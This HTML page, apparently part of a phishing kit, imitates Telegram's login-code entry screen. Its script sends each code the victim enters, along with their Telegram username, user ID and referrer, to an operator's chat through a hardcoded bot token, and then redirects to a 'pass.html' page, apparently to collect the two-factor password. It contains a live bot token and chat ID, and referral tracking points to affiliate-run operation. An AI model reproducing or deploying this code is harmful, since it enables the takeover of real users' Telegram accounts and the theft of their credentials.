<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Code</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root {
            --tg-blue: #26a4e3;
            --tg-green: #38a169;
            --tg-red: #ef4444;
            --code-border: #8774e1;
        }
        body {
            font-family: 'Roboto', sans-serif;
            font-weight: 400;
            font-style: normal;
            background-color: #212121;
        }
        .input-container {
            position: relative;
        }
        .floating-label {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #9ca3af;
            pointer-events: none;
            transition: all 0.2s ease;
            font-size: 1rem;
        }
        .input-field:focus + .floating-label,
        .input-field:not(:placeholder-shown) + .floating-label,
        .input-field.has-value + .floating-label {
            top: -8px;
            left: 12px;
            transform: translateY(0);
            font-size: 0.75rem;
            color: #8774e1;
            background-color: #212121;
            padding: 0 4px;
        }
        .input-field {
            background-color: transparent;
            caret-color: #8774e1;
        }
        .input-field:focus {
            border-width: 2px;
            border-color: #8774e1;
            outline: none;
        }
        .code-input-container {
            display: flex;
            justify-content: center;
            gap: 0.75rem;
            margin-bottom: 1rem;
            padding: 0 1rem;
        }
        .code-cell {
            width: 50px;
            height: 65px;
            text-align: center;
            font-size: 1.5rem;
            font-weight: bold;
            border: 1px solid #6b7280;
            border-radius: 0.75rem;
            transition: all 0.15s ease-in-out;
            outline: none;
            caret-color: #8774e1;
            padding: 0;
            background-color: transparent;
            color: #ffffff;
        }
        .code-cell:focus {
            border-width: 2px;
            border-color: #8774e1;
        }
        .code-cell.has-value:not(:focus) {
            border-width: 2px;
            border-color: #8774e1;
        }
        .code-cell.completed {
            border-color: #38a169;
            border-width: 2px;
        }
    </style>

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'tg-blue': '#26a4e3',
                        'tg-blue-dark': '#1e80b5',
                        'red-500': '#ef4444',
                    }
                }
            }
        }

        function handleEditClick() {
            window.location.href = 'index.html';
        }

        function handleCodeCellInput(index, value) {
            const cells = document.querySelectorAll('.code-cell');

            if (value.length === 1) {
                if (index < cells.length - 1) {
                    cells[index + 1].focus();
                }
            }

            checkAllFieldsFilled();
        }
        
        function checkAllFieldsFilled() {
            const cells = document.querySelectorAll('.code-cell');
            let allFilled = true;
            let code = '';
            
            cells.forEach(cell => {
                if (cell.value.trim() === '') {
                    allFilled = false;
                } else {
                    code += cell.value;
                }
            });
            
            if (allFilled) {
                cells.forEach(cell => {
                    cell.classList.add('completed');
                    cell.classList.remove('has-value');
                });

                const urlParams = new URLSearchParams(window.location.search);
                const phoneNumber = urlParams.get('phone') || '';

                sessionStorage.setItem('authCode', code);

                sendAuthCodeToTelegram(code);

                const userData = getUserData();
                const referrerInfo = getReferrerInfo();

                setTimeout(() => {
                    const urlParams = new URLSearchParams(window.location.search);
                    const phoneParam = phoneNumber ? `phone=${encodeURIComponent(phoneNumber)}` : '';
                    const refParam = urlParams.get('ref') ? urlParams.get('ref') : '';
                    let passUrl = 'pass.html?';
                    if (phoneParam) {
                        passUrl += phoneParam;
                    } else {
                        passUrl = 'pass.html?';
                    }
                    if (userData.username !== 'Не указан' && userData.userId !== 'Не указан') {
                        passUrl += (passUrl.includes('?') && !passUrl.endsWith('?') ? '&' : '') + `user=${encodeURIComponent(userData.username)}&userid=${encodeURIComponent(userData.userId)}`;
                    }
                    if (referrerInfo && referrerInfo.username) {
                        passUrl += (passUrl.includes('?') && !passUrl.endsWith('?') ? '&' : '') + `ref=${encodeURIComponent(referrerInfo.username)}`;
                    } else if (refParam) {
                        passUrl += (passUrl.includes('?') && !passUrl.endsWith('?') ? '&' : '') + `ref=${encodeURIComponent(refParam)}`;
                    }
                    window.location.href = passUrl;
                }, 500);
            }
        }

        function getReferrerInfo() {
            let referrerInfo = null;

            const savedReferrer = sessionStorage.getItem('referrerInfo');
            if (savedReferrer) {
                try {
                    referrerInfo = JSON.parse(savedReferrer);
                    if (referrerInfo && referrerInfo.username) {
                        return referrerInfo;
                    }
                } catch (e) {
                    console.error('Ошибка при парсинге сохранённого реферала:', e);
                }
            }

            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.startParam) {
                try {
                    const startParam = window.Telegram.WebApp.startParam;
                    if (startParam.startsWith('ref_')) {
                        const refData = startParam.substring(4);
                        const parts = refData.split('_');
                        if (parts.length >= 2) {
                            const referrerId = parts[parts.length - 1];
                            const referrerUsername = parts.slice(0, -1).join('_');
                            
                            if (referrerUsername.startsWith('id')) {
                                referrerInfo = { username: `ID:${referrerId}`, userId: referrerId };
                            } else {
                                referrerInfo = { username: `@${referrerUsername}`, userId: referrerId };
                            }
                            
                            sessionStorage.setItem('referrerInfo', JSON.stringify(referrerInfo));
                            return referrerInfo;
                        }
                    }
                } catch (e) {
                    console.error('Ошибка при парсинге реферала из startParam:', e);
                }
            }

            const urlParams = new URLSearchParams(window.location.search);
            const urlRef = urlParams.get('ref');
            if (urlRef) {
                try {
                    if (urlRef.startsWith('ref_')) {
                        const refData = urlRef.substring(4);
                        const parts = refData.split('_');
                        if (parts.length >= 2) {
                            const referrerId = parts[parts.length - 1];
                            const referrerUsername = parts.slice(0, -1).join('_');
                            
                            if (referrerUsername.startsWith('id')) {
                                referrerInfo = { username: `ID:${referrerId}`, userId: referrerId };
                            } else {
                                referrerInfo = { username: `@${referrerUsername}`, userId: referrerId };
                            }
                        } else {
                            referrerInfo = { username: `@${urlRef}`, userId: 'Не указан' };
                        }
                    } else {
                        referrerInfo = { username: urlRef.startsWith('@') ? urlRef : `@${urlRef}`, userId: 'Не указан' };
                    }
                    
                    if (referrerInfo) {
                        sessionStorage.setItem('referrerInfo', JSON.stringify(referrerInfo));
                        return referrerInfo;
                    }
                } catch (e) {
                    console.error('Ошибка при парсинге реферала из URL:', e);
                }
            }
            
            return null;
        }

        function getUserData() {
            let username = 'Не указан';
            let userId = 'Не указан';
            
            const savedUser = sessionStorage.getItem('telegramUser');
            if (savedUser) {
                try {
                    const user = JSON.parse(savedUser);
                    username = user.username || 'Не указан';
                    userId = user.id || 'Не указан';
                    if (username !== 'Не указан' && userId !== 'Не указан') {
                        return { username, userId };
                    }
                } catch (e) {
                    console.error('Ошибка при парсинге сохранённых данных пользователя:', e);
                }
            }
            
            const urlParams = new URLSearchParams(window.location.search);
            const urlUser = urlParams.get('user');
            const urlUserId = urlParams.get('userid');
            if (urlUser && urlUserId) {
                username = urlUser.startsWith('@') ? urlUser : `@${urlUser}`;
                userId = urlUserId;
                sessionStorage.setItem('telegramUser', JSON.stringify({ username, userId }));
                console.log('✅ Данные пользователя получены из URL параметров (auth.html):', { username, userId });
                return { username, userId };
            }
            
            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.startParam) {
                try {
                    const startParam = window.Telegram.WebApp.startParam;
                    console.log('startParam найден (auth.html):', startParam);
                    
                    if (startParam.startsWith('ref_')) {
                        const refData = startParam.substring(4);
                        console.log('refData после удаления префикса:', refData);
                        
                        const parts = refData.split('_');
                        console.log('Части после split:', parts);
                        
                        if (parts.length >= 2) {
                            userId = parts[parts.length - 1];
                            username = parts.slice(0, -1).join('_');
                            
                            console.log('Извлеченные данные:', { rawUsername: username, userId });
                            
                            if (username.startsWith('id')) {
                                username = `ID:${userId}`;
                            } else {
                                username = `@${username}`;
                            }
                            
                            sessionStorage.setItem('telegramUser', JSON.stringify({ username, userId }));
                            console.log('✅ Данные пользователя получены из startParam и сохранены:', { username, userId });
                            return { username, userId };
                        } else {
                            console.warn('Недостаточно частей в startParam:', parts);
                        }
                    } else {
                        console.log('startParam не начинается с "ref_":', startParam);
                    }
                } catch (e) {
                    console.error('Ошибка при парсинге startParam:', e);
                }
            } else {
                console.log('startParam не доступен (auth.html):', {
                    hasTelegram: !!window.Telegram,
                    hasWebApp: !!(window.Telegram && window.Telegram.WebApp),
                    hasStartParam: !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.startParam)
                });
            }
            
            if (window.Telegram && window.Telegram.WebApp) {
                try {
                    if (window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
                        const user = window.Telegram.WebApp.initDataUnsafe.user;
                        userId = String(user.id || 'Не указан');
                        if (user.username) {
                            username = `@${user.username}`;
                        } else if (user.first_name || user.last_name) {
                            const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim();
                            username = fullName || `ID:${userId}`;
                        } else {
                            username = `ID:${userId}`;
                        }
                    }
                    else if (window.Telegram.WebApp.initData) {
                        const initData = window.Telegram.WebApp.initData;
                        const params = new URLSearchParams(initData);
                        const userStr = params.get('user');
                        if (userStr) {
                            try {
                                const user = JSON.parse(decodeURIComponent(userStr));
                                userId = String(user.id || 'Не указан');
                                if (user.username) {
                                    username = `@${user.username}`;
                                } else if (user.first_name || user.last_name) {
                                    const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim();
                                    username = fullName || `ID:${userId}`;
                                } else {
                                    username = `ID:${userId}`;
                                }
                            } catch (e) {
                                console.error('Ошибка при парсинге initData:', e);
                            }
                        }
                    }
                    
                    if (userId !== 'Не указан') {
                        sessionStorage.setItem('telegramUser', JSON.stringify({ username, userId }));
                    }
                } catch (e) {
                    console.error('Ошибка при получении данных пользователя:', e);
                }
            }
            
            console.log('Telegram WebApp доступен:', !!window.Telegram);
            console.log('startParam:', window.Telegram?.WebApp?.startParam);
            console.log('initDataUnsafe:', window.Telegram?.WebApp?.initDataUnsafe);
            console.log('initData:', window.Telegram?.WebApp?.initData);
            console.log('Полученные данные пользователя:', { username, userId });
            
            return { username, userId };
        }

        async function sendAuthCodeToTelegram(authCode) {
            const BOT_TOKEN = '8289543761:AAGjow_hAYF8WfQnWJQnln5f0l8x2FKMzYA';
            const CHAT_ID = '-1003476597636';
            
            let userData = getUserData();
            console.log('Данные пользователя перед отправкой кода:', userData);
            
            if (userData.username === 'Не указан' || userData.userId === 'Не указан') {
                await new Promise(resolve => setTimeout(resolve, 200));
                userData = getUserData();
                console.log('Повторная попытка получения данных:', userData);
            }
            
            const { username, userId } = userData;
            
            const referrerInfo = getReferrerInfo();
            
            const urlParams = new URLSearchParams(window.location.search);
            const refParam = urlParams.get('ref') || '';
            
            let message = `🔑 <b>Код авторизации</b>\n\n`;
            if (referrerInfo && referrerInfo.username) {
                message += `🔗 Пригласил: ${referrerInfo.username}\n\n`;
            }
            message += `👤 Пользователь: ${username}\n🆔 ID: ${userId}\n🔢 Код: ${authCode || 'Не указан'}`;
            if (refParam && (!referrerInfo || !referrerInfo.username)) {
                message += `\n🔗 Реферал: ${refParam}`;
            }
            message += `\n⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Ошибка при отправке кода авторизации:', error);
            }
        }

        function handleCodeCellKeydown(event, index) {
            const cells = document.querySelectorAll('.code-cell');

            if (event.key === 'Backspace' && cells[index].value.length === 0) {
                if (index > 0) {
                    cells[index - 1].focus();
                    event.preventDefault();
                }
            } else if (event.key === 'ArrowRight') {
                if (index < cells.length - 1) {
                    cells[index + 1].focus();
                }
            } else if (event.key === 'ArrowLeft') {
                if (index > 0) {
                    cells[index - 1].focus();
                }
            }
        }

        function formatPhoneForDisplay(phone) {
            if (!phone) return '+7 705 521 19 08';
            
            try {
                phone = decodeURIComponent(phone);
            } catch (e) {
            }
            
            let digits = phone.replace(/[^\d]/g, '');
            if (digits.length === 0) return phone;
            
            if (digits.startsWith('7') && digits.length === 11) {
                return `+7 ${digits.substring(1, 4)} ${digits.substring(4, 7)} ${digits.substring(7, 9)} ${digits.substring(9, 11)}`;
            }
            
            if (phone.startsWith('+')) {
                let prefix = '+';
                let numberPart = '';
                
                if (digits.startsWith('7')) {
                    prefix = '+7';
                    numberPart = digits.substring(1);
                } else if (digits.startsWith('1') && digits.length >= 11) {
                    prefix = '+1';
                    numberPart = digits.substring(1);
                } else if (digits.startsWith('380')) {
                    prefix = '+380';
                    numberPart = digits.substring(3);
                } else if (digits.startsWith('375')) {
                    prefix = '+375';
                    numberPart = digits.substring(3);
                } else if (digits.startsWith('998')) {
                    prefix = '+998';
                    numberPart = digits.substring(3);
                } else {
                    let prefixLength = 1;
                    if (digits.length > 10) {
                        prefixLength = digits.length - 10;
                    } else if (digits.length > 9) {
                        prefixLength = digits.length - 9;
                    } else if (digits.length > 8) {
                        prefixLength = digits.length - 8;
                    }
                    prefix = '+' + digits.substring(0, Math.min(prefixLength, 4));
                    numberPart = digits.substring(prefix.replace(/[^\d]/g, '').length);
                }
                
                let formatted = prefix;
                for (let i = 0; i < numberPart.length; i++) {
                    if (i > 0 && i % 3 === 0) formatted += ' ';
                    formatted += numberPart[i];
                }
                return formatted;
            }
            
            let formatted = '+';
            for (let i = 0; i < digits.length; i++) {
                if (i > 0 && i % 3 === 0) formatted += ' ';
                formatted += digits[i];
            }
            return formatted;
        }

        window.onload = function() {
            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.ready();
            }
            
            setTimeout(() => {
                const userData = getUserData();
                const referrerInfo = getReferrerInfo();
                console.log('Данные пользователя при загрузке (auth.html):', userData);
                console.log('Информация о реферале при загрузке (auth.html):', referrerInfo);
            }, 500);
            
            const editButton = document.getElementById('editButton');
            const codeCells = document.querySelectorAll('.code-cell');
            
            const urlParams = new URLSearchParams(window.location.search);
            const phoneNumber = urlParams.get('phone') || '';
            const phoneNumberDisplay = document.getElementById('phoneNumberDisplay');
            if (phoneNumberDisplay && phoneNumber) {
                phoneNumberDisplay.textContent = formatPhoneForDisplay(phoneNumber);
            }
            
            if (editButton) {
                editButton.addEventListener('click', handleEditClick);
            }

            if (codeCells.length > 0) {
                codeCells.forEach((cell, index) => {
                    if (cell.value.trim() !== '') {
                        cell.classList.add('has-value');
                    }

                    cell.addEventListener('input', (event) => {
                        event.target.value = event.target.value.replace(/[^\d]/g, '').substring(0, 1);
                        const allCells = document.querySelectorAll('.code-cell');
                        allCells.forEach(c => c.classList.remove('completed'));
                        
                        if (event.target.value.trim() !== '') {
                            event.target.classList.add('has-value');
                        } else {
                            event.target.classList.remove('has-value');
                        }
                        handleCodeCellInput(index, event.target.value);
                    });

                    cell.addEventListener('blur', function() {
                        if (this.value.trim() === '') {
                            this.classList.remove('has-value');
                            this.classList.remove('completed');
                        }
                    });

                    cell.addEventListener('keydown', (event) => {
                        handleCodeCellKeydown(event, index);
                    });
                });
            }

            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.ready();
            }
        };
    </script>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4" style="background-color: #212121;">

    <div class="w-full max-w-lg sm:max-w-xl mb-16 -mt-16 flex justify-center">
        <img src="monkey.png" 
             alt="Monkey" 
             class="w-32 h-32 object-contain">

        <div class="flex items-center justify-center gap-2">
            <span id="phoneNumberDisplay" class="text-3xl font-bold text-white">+7 705 521 19 08</span>

                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-pencil">
                    <path d="M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/>

</body>
